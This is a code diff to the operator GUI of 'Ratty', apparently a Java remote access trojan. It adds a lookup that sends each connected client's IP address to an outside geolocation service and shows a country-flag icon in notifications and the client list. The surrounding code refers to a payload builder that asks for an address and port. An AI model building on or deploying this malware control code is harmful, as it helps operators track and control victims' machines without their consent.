@@ -5,9 +5,12 @@ import static de.sogomn.rat.Ratty.LANGUAGE;
 import java.awt.image.BufferedImage;
 import java.io.File;
 import java.io.IOException;
+import java.net.URL;
 import java.util.HashMap;
 import java.util.Set;
 
+import javax.imageio.ImageIO;
+import javax.swing.ImageIcon;
 import javax.swing.JOptionPane;
 
 import de.sogomn.engine.fx.Sound;
@@ -75,6 +78,8 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String BUILDER_ADDRESS_QUESTION = LANGUAGE.getString("builder.address_question");
 	private static final String BUILDER_PORT_QUESTION = LANGUAGE.getString("builder.port_question");
 	private static final String URL_MESSAGE = LANGUAGE.getString("server.url_message");
+	
+	private static final String FLAG_ADDRESS = "http://www.geojoe.co.uk/api/flag/?ip=";
 	
 	private static final Sound PING = Sound.loadSound("/ping.wav");
 	
@@ -473,15 +478,30 @@ public final class RattyGuiController extends AbstractRattyController implements
 	 * ==================================================
 	 */
 	
+	private ImageIcon getFlagIcon(final String address) {
+		try {
+			final String requestAddress = FLAG_ADDRESS + address;
+			final URL url = new URL(requestAddress);
+			final BufferedImage image = ImageIO.read(url);
+			final ImageIcon icon = new ImageIcon(image);
+			
+			return icon;
+		} catch (final IOException ex) {
+			ex.printStackTrace();
+			
+			return null;
+		}
+	}
+	
 	private void logIn(final ServerClient client, final InformationPacket packet) {
 		final String name = packet.getName();
-		final String location = packet.getLocation();
 		final String os = packet.getOs();
 		final String version = packet.getVersion();
 		final String address = client.getAddress();
-		final Notification notification = new Notification(name + " " + address);
+		final ImageIcon icon = getFlagIcon(address);
+		final Notification notification = new Notification(name + " " + address, icon);
 		
-		client.logIn(name, location, os, version);
+		client.logIn(name, os, version, icon);
 		client.addListener(this);
 		
 		gui.addRow(client);
